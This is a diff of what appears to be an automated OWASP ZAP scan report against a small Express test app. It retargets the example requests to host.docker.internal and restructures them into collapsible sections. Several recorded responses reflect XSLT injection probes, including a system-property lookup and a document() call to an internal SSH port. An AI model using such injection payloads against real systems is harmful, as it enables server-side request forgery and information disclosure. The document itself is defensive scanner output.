+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
       }
@@ -1825,10 +2116,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1836,10 +2127,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "381",
+        "Content-Length": "531",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"17d-QYebtefhBjWiBOENFDQUzdqjjos\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"213-1mZDED9sbTKOY6odiS+5bZq5RWU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1855,8 +2146,10 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -1864,16 +2157,18 @@ The following examples were found in the application.
       
       ```
 
-**Example 3**
+</details>
+
+<details><summary>Example 3</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
       }
@@ -1883,10 +2178,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1894,10 +2189,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "368",
+        "Content-Length": "518",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"170-lCiktpVT6GX3BbEDA9WAZgxAqxU\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"206-IrrXfbMCfRtENuafn7VL1+5lxI8\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1913,24 +2208,28 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 4**
+</details>
+
+<details><summary>Example 4</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
       }
@@ -1940,10 +2239,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -1951,10 +2250,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "407",
+        "Content-Length": "290",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"197-o3KG3C9J1F26pXoqTV/WyIa6DFo\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"122-CGh9vDYvSICxraLHDrlRPn+M6pk\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -1970,27 +2269,25 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul></ul>
       </body>
       </html>
       
       ```
 
-**Example 5**
+</details>
+
+<details><summary>Example 5</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0"
       }
@@ -2000,10 +2297,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2011,10 +2308,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "290",
+        "Content-Length": "302",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"122-u8C4e41zuW8gNQe38sGtns8AswE\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"12e-10ZzD3kPeKB6Fw6CMNFkXrf/FnQ\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2030,23 +2327,25 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul></ul>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li></ul>
       </body>
       </html>
       
       ```
 
-**Example 6**
+</details>
+
+<details><summary>Example 6</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
       }
@@ -2056,10 +2355,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2067,10 +2366,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "354",
+        "Content-Length": "328",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"162-Yv4sJjwnurb5sL1DnLSO7K0AiIk\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"148-jMtUusvwRYGYAISAEwxaNKiGJK8\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2086,10 +2385,8 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -2097,16 +2394,18 @@ The following examples were found in the application.
       
       ```
 
-**Example 7**
+</details>
+
+<details><summary>Example 7</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0"
       }
@@ -2116,126 +2415,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0" \
-        "http://localhost:3000"
-      ```
-* **Response**
-    * **Status Code**: `200`
-    * **Headers**:
-      ```json
-      {
-        "Connection": "keep-alive",
-        "Content-Length": "354",
-        "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"162-Yv4sJjwnurb5sL1DnLSO7K0AiIk\"",
-        "Keep-Alive": "timeout=5",
-        "X-Powered-By": "Express"
-      }
-      ```
-    * **Body**:
-      ```html
-      <!doctype html>
-      <html lang="en">
-      <body>
-      <a href="/search">Search</a>
-      <form method="post" action="/">
-        <label for="words">Enter some words</label>
-        <input name="words" id="words" />
-        <button type="submit">Submit</button>
-      </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li>
-      <li>ZAP</li></ul>
-      </body>
-      </html>
-      
-      ```
-
-**Example 8**
-
-* **Request**
-    * **Target**: `http://localhost:3000`
-    * **Method**: `GET`
-    * **Headers**:
-      ```json
-      {
-        "cache-control": "no-cache",
-        "host": "localhost:3000",
-        "pragma": "no-cache",
-        "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
-      }
-      ```
-    * **Curl**:
-      ```shell
-      curl -o - -i \
-        -X GET \
-        -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
-        -H "pragma: no-cache" \
-        -H "user-agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
-        "http://localhost:3000"
-      ```
-* **Response**
-    * **Status Code**: `200`
-    * **Headers**:
-      ```json
-      {
-        "Connection": "keep-alive",
-        "Content-Length": "290",
-        "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"122-u8C4e41zuW8gNQe38sGtns8AswE\"",
-        "Keep-Alive": "timeout=5",
-        "X-Powered-By": "Express"
-      }
-      ```
-    * **Body**:
-      ```html
-      <!doctype html>
-      <html lang="en">
-      <body>
-      <a href="/search">Search</a>
-      <form method="post" action="/">
-        <label for="words">Enter some words</label>
-        <input name="words" id="words" />
-        <button type="submit">Submit</button>
-      </form>
-      91982f77522dbe8334d889f270952f96
-      <ul></ul>
-      </body>
-      </html>
-      
-      ```
-
-**Example 9**
-
-* **Request**
-    * **Target**: `http://localhost:3000`
-    * **Method**: `GET`
-    * **Headers**:
-      ```json
-      {
-        "cache-control": "no-cache",
-        "host": "localhost:3000",
-        "pragma": "no-cache",
-        "user-agent": "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
-      }
-      ```
-    * **Curl**:
-      ```shell
-      curl -o - -i \
-        -X GET \
-        -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
-        -H "pragma: no-cache" \
-        -H "user-agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2245,8 +2428,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "315",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"13b-a8pXFGhzT4FQ2yc6+5Z+5hrwsq0\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"13b-52cqF2z1H+CMhJbS0reiqvLkugU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2262,7 +2445,7 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -2270,18 +2453,20 @@ The following examples were found in the application.
       
       ```
 
-**Example 10**
+</details>
+
+<details><summary>Example 8</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4"
+        "user-agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
       }
       ```
     * **Curl**:
@@ -2289,10 +2474,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4" \
-        "http://localhost:3000"
+        -H "user-agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2302,8 +2487,8 @@ The following examples were found in the application.
         "Connection": "keep-alive",
         "Content-Length": "341",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"155-VEAg96LZnMsmn/o+Y0UA6RLfLm4\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"155-TK87Td36fgA0KgK93e0RtqEN7mE\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2319,7 +2504,7 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li>
@@ -2329,16 +2514,138 @@ The following examples were found in the application.
       
       ```
 
-**Example 11**
+</details>
+
+<details><summary>Example 9</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000`
+    * **Target**: `http://host.docker.internal:3000`
     * **Method**: `GET`
     * **Headers**:
       ```json
       {
         "cache-control": "no-cache",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "user-agent": "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
+      }
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X GET \
+        -H "cache-control: no-cache" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "user-agent: Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" \
+        "http://host.docker.internal:3000"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "354",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"162-DPcz2kabVo1ja+wrMo6SSXRgqQg\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
+
+<details><summary>Example 10</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000`
+    * **Method**: `GET`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4"
+      }
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X GET \
+        -H "cache-control: no-cache" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4" \
+        "http://host.docker.internal:3000"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "302",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"12e-10ZzD3kPeKB6Fw6CMNFkXrf/FnQ\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>ZAP</li></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
+
+<details><summary>Example 11</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000`
+    * **Method**: `GET`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
         "user-agent": "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16"
       }
@@ -2348,10 +2655,10 @@ The following examples were found in the application.
       curl -o - -i \
         -X GET \
         -H "cache-control: no-cache" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
         -H "user-agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16" \
-        "http://localhost:3000"
+        "http://host.docker.internal:3000"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2359,10 +2666,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "328",
+        "Content-Length": "290",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"148-Ge9JyRfM22q4Gd1Ey7I9Nv95nxY\"",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"122-CGh9vDYvSICxraLHDrlRPn+M6pk\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2378,8 +2685,68 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul></ul>
+      </body>
+      </html>
+      
+      ```
+
+</details>
+
+<details><summary>Example 12</summary>
+
+* **Request**
+    * **Target**: `http://host.docker.internal:3000`
+    * **Method**: `GET`
+    * **Headers**:
+      ```json
+      {
+        "cache-control": "no-cache",
+        "host": "host.docker.internal:3000",
+        "pragma": "no-cache",
+        "user-agent": "msnbot/1.1 (+http://search.msn.com/msnbot.htm)"
+      }
+      ```
+    * **Curl**:
+      ```shell
+      curl -o - -i \
+        -X GET \
+        -H "cache-control: no-cache" \
+        -H "host: host.docker.internal:3000" \
+        -H "pragma: no-cache" \
+        -H "user-agent: msnbot/1.1 (+http://search.msn.com/msnbot.htm)" \
+        "http://host.docker.internal:3000"
+      ```
+* **Response**
+    * **Status Code**: `200`
+    * **Headers**:
+      ```json
+      {
+        "Connection": "keep-alive",
+        "Content-Length": "354",
+        "Content-Type": "text/html; charset=utf-8",
+        "Date": "Mon, 24 Jul 2023 14:41:35 GMT",
+        "ETag": "W/\"162-DPcz2kabVo1ja+wrMo6SSXRgqQg\"",
+        "Keep-Alive": "timeout=5",
+        "X-Powered-By": "Express"
+      }
+      ```
+    * **Body**:
+      ```html
+      <!doctype html>
+      <html lang="en">
+      <body>
+      <a href="/search">Search</a>
+      <form method="post" action="/">
+        <label for="words">Enter some words</label>
+        <input name="words" id="words" />
+        <button type="submit">Submit</button>
+      </form>
+      e836fe8362e3626c6adbb03926fa58d9
       <ul><li>ZAP</li>
+      <li>ZAP</li>
+      <li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -2387,10 +2754,12 @@ The following examples were found in the application.
       
       ```
 
-**Example 12**
+</details>
+
+<details><summary>Example 13</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2398,9 +2767,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
       }
       ```
@@ -2415,11 +2784,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2427,10 +2796,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "394",
+        "Content-Length": "544",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"18a-HZTbdtbI9OY+wL8hP8z4SURZxdg\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"220-xsHoxhvHq/zlIgowFxilcV4X5Dw\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2446,8 +2815,10 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
@@ -2456,10 +2827,12 @@ The following examples were found in the application.
       
       ```
 
-**Example 13**
+</details>
+
+<details><summary>Example 14</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2467,9 +2840,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
       }
       ```
@@ -2484,11 +2857,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2496,10 +2869,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "381",
+        "Content-Length": "531",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"17d-QYebtefhBjWiBOENFDQUzdqjjos\"",
+        "Date": "Mon, 24 Jul 2023 14:41:34 GMT",
+        "ETag": "W/\"213-1mZDED9sbTKOY6odiS+5bZq5RWU\"",
         "Keep-Alive": "timeout=5",
         "X-Powered-By": "Express"
       }
@@ -2515,8 +2888,10 @@ The following examples were found in the application.
         <input name="words" id="words" />
         <button type="submit">Submit</button>
       </form>
-      91982f77522dbe8334d889f270952f96
-      <ul><li><xsl:value-of select="document('http://localhost:22')"/></li>
+      e836fe8362e3626c6adbb03926fa58d9
+      <ul><li>"/><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="system-property('xsl:vendor')"/><!--</li>
+      <li><xsl:value-of select="document('http://host.docker.internal:22')"/></li>
       <li>ZAP</li>
       <li>ZAP</li></ul>
       </body>
@@ -2524,10 +2899,12 @@ The following examples were found in the application.
       
       ```
 
-**Example 14**
+</details>
+
+<details><summary>Example 15</summary>
 
 * **Request**
-    * **Target**: `http://localhost:3000/`
+    * **Target**: `http://host.docker.internal:3000/`
     * **Method**: `POST`
     * **Headers**:
       ```json
@@ -2535,9 +2912,9 @@ The following examples were found in the application.
         "cache-control": "no-cache",
         "content-length": "9",
         "content-type": "application/x-www-form-urlencoded",
-        "host": "localhost:3000",
+        "host": "host.docker.internal:3000",
         "pragma": "no-cache",
-        "referer": "http://localhost:3000",
+        "referer": "http://host.docker.internal:3000",
         "user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)"
       }
       ```
@@ -2552,11 +2929,11 @@ The following examples were found in the application.
         --data 'words=ZAP' \
         -H "cache-control: no-cache" \
         -H "content-type: application/x-www-form-urlencoded" \
-        -H "host: localhost:3000" \
+        -H "host: host.docker.internal:3000" \
         -H "pragma: no-cache" \
-        -H "referer: http://localhost:3000" \
+        -H "referer: http://host.docker.internal:3000" \
         -H "user-agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)" \
-        "http://localhost:3000/"
+        "http://host.docker.internal:3000/"
       ```
 * **Response**
     * **Status Code**: `200`
@@ -2564,10 +2941,10 @@ The following examples were found in the application.
       ```json
       {
         "Connection": "keep-alive",
-        "Content-Length": "368",
+        "Content-Length": "518",
         "Content-Type": "text/html; charset=utf-8",
-        "Date": "Sun, 23 Jul 2023 10:58:09 GMT",
-        "ETag": "W/\"170-lCiktpVT6GX3BbEDA9WAZgxAqxU\"",
